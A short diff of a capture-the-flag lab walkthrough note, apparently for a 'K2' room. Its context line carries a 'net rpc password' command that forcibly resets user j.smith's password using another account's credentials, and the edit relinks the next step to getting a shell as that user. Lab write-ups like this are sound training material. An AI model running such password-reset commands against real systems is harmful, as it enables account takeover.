@@ -13,4 +13,4 @@ net rpc password "j.smith" "Password123@" -U "k2.thm"/"j.bold"%"#8rockyou" -S K2
 The new password is `Password123@`.
 
 
-**Next step:** [[Connecting with WinRM]]
+**Next step:** [[Shell as J.Smith]]
